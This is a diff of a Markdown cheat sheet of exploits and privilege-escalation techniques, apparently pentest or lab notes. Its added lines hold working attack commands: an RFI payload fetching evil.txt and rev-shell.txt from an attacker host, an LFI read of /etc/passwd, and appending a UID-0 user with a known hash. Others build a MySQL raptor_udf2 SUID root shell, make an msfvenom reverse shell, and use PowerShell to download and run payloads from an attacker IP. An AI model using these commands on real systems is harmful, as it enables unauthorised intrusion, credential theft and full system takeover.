@@ -113,7 +113,7 @@ Here I am collectign some of the random exploits and their exploitation technqiu
 |9.| Real VNC 4.1.0/4.1.1 | Authenticaton Bypass | Administrator password was writeen in the macine login window.|[36932](https://www.exploit-db.com/exploits/36932) | Reverse Shell | Writeup and Reference |
 |10.| ACS(Advanced Comment System) | LFI/RFI | Scenario | Working Exploits | Reverse Shell | https://192.168.130.5/internal/advanced_comment_system/index.php?ACS_path=http://192.168.30.120/evil.txt%00 content of Content of evil.txt <?php print system("cat /etc/passwd");?> RFI http://10.1.1.8//internal/advanced_comment_system/admin.php?ACS_path=http://10.21.0.40/rev-shell.txt%00|
 |11| HP Power Manager | Buffer Overflow | HP Power manager is running |[hpm_exploit.py] (https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py) | Reverse Shell | Writeup and Reference |
-|12.| php mailer and cs cart |[LFI](http://10.2.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../etc/passwd%00) | Scenario | Working Exploits | Reverse Shell | Writeup and Reference |
+|12.| php mailer and cs cart |LFI (http://10.2.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../etc/passwd%00) | Scenario | Working Exploits | Reverse Shell | http://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-slides.pdf |
 
 
 
@@ -191,6 +191,20 @@ chown root:root backdoor
 chmod u+s backdoor
 ```
 
+## suid in cp
+```bash
+
+root@kali:~# openssl passwd -1 -salt testuser test123
+$1$testuser$ufvpYjLWZk.6cAs3/d3pN0
+
+append to passwd file
+
+testuser:$1$testuser$ufvpYjLWZk.6cAs3/d3pN0:0:0:root:/root:/bin/bash
+
+bash-4.2$ su testuser
+Password test123
+```
+
 ### /etc/passwd world writable
 * Simply appending in /etc/passwd and making the UID 0 will provide you the root access to system. 
 * Generate the password:  perl -le 'print crypt("foo", "aa")'
@@ -220,6 +234,24 @@ Eg. * * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
 
 In this case you can simply replace the /var/www/laravel/artisan file with one liner php reverse shell.
 
+## mysqld service using root account with no password
+```bash
+$mysqld --version
+$ gcc -g -c raptor_udf2.c -fPIC
+$ gcc -g -shared -Wl, -soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lC
+$ mysql -u root -p
+
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/home/user/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
+mysql> exit
+
+$/tmp/rootbash -p
+#
+```
 ## Windows Privilege Escalation
 The ultimate goal is to gain a shell running as administrator or system users. Windows privilege escalations can be simple(eg. a kernel exploits) or require a lot of reconnaissance on the compromised system. 
 In lot of cases it may not rely on a single misconfigurations, but may require you to think and combine multiple configurations. 
@@ -759,7 +791,24 @@ and execute it to get a shell via the port forward:
 # winexe -U 'admin%password123' //localhost cmd.exe
 ```
 
+## powershell
+```bash
 
+1. msfvenom --platform Windows -f exe -p windows/x64/shell_reverse_tcp LHOST=192.168.119.239 LPORT=6565 -o shell.exe
+- Copy shell.exe to web server
+
+2. Download shell.exe to Bethany
+Powershell -c "Invoke-WebRequest -Uri http://192.168.119.239:7878/shell.exe -OutFile C:\Users\Public\shell.exe"
+
+3. Download reverse.ps1 to Bethany
+Powershell -c "Invoke-WebRequest -Uri http://192.168.119.239:7878/reverse.ps1 -OutFile C:\Users\Public\reverse.ps1"
+
+4. nc -nlvp 6565
+
+5. C:\Users\Public>powershell -ExecutionPolicy Bypass -File c:\users\public\reverse.ps1
+
+Elevate to admin user
+```
 ### Iperius Backup 6.1.0 - Privilege Escalation
 Scenario: On a VNC accessible machine this service is running. Use the exploit [46863](https://www.exploit-db.com/exploits/46863) in exploitdb.
 
